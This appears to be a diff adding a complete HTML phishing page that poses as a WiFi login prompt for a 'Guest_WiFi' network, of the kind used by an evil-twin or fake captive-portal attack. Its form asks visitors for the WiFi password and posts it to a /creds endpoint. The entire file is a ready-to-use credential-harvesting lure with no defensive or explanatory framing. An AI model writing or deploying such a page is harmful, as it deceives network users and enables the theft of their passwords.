@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Connection Required</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 0 auto; background: #fff; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .icon { text-align: center; font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 20px; text-align: center; color: #333; margin-bottom: 20px; }
+        p { color: #666; text-align: center; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        .ssid { background: #f0f0f0; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📶</div>
+        <h1>WiFi Connection Required</h1>
+        <p>Please enter your WiFi password to continue</p>
+        <div class="ssid">Network: <strong>Guest_WiFi</strong></div>
+        <form action="/creds" method="POST">
+            <input type="password" name="password" placeholder="WiFi Password" required>
+            <button type="submit">Connect</button>
+        </form>
+    </div>
+</body>
+</html>
